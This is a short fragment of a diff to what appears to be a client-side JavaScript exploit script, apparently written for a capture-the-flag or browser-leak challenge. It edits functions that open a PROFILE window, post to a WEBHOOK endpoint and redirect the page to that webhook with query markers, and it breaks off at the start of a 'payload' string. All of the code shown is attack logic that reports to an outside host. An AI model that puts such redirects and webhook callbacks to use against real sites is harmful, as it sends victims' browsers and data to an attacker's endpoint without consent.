@@ -17,12 +17,10 @@ function post(url, data) {
 }
 
 function openProfile() {
-  const o = window.open(PROFILE, "toto");
-  post(`${WEBHOOK}?end`, o);
-  // document.location.href = WEBHOOK;
+  document.location = WEBHOOK;
 }
 
-window.location = WEBHOOK;
+document.location = WEBHOOK + "?doc";
 window.open(PROFILE, OPEN);
 
 const payload = `
